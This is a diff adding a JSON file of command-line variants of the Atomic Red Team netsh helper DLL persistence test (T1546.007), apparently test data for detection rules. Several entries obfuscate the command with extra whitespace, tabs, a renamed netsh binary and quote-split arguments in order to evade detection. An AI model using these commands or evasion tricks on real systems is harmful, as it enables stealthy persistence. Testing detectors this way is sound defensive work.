@@ -1,0 +1,22 @@
+[
+  {
+    "output": "netsh.exe add helper \"C:\\AtomicRedTeam\\atomics\\T1546.007\\bin\\NetshHelper.dll\"",
+    "explanation": "This is the original command and serves as a baseline for testing."
+  },
+  {
+    "output": "netsh.exe  add helper \"C:\\AtomicRedTeam\\atomics\\T1546.007\\bin\\NetshHelper.dll\"",
+    "explanation": "Inserted an extra space before the first argument to test insertion mutation technique."
+  },
+  {
+    "output": "copy netsh.exe not_netsh.exe && not_netsh.exe add helper evil.dll",
+    "explanation": "Copied netsh.exe to a renamed executable and executed it to test omission and substitution techniques."
+  },
+  {
+    "output": "netsh add\thelper evil.dll",
+    "explanation": "Replaced space with a tab character to test reordering and substitution techniques."
+  },
+  {
+    "output": "netsh.exe \"a\"\"d\"\"d\" \"h\"\"e\"\"l\"\"p\"\"e\"\"r\" evil.dll",
+    "explanation": "Split each letter of 'add' and 'helper' into quoted characters to test recoding/encoding mutation technique."
+  }
+]
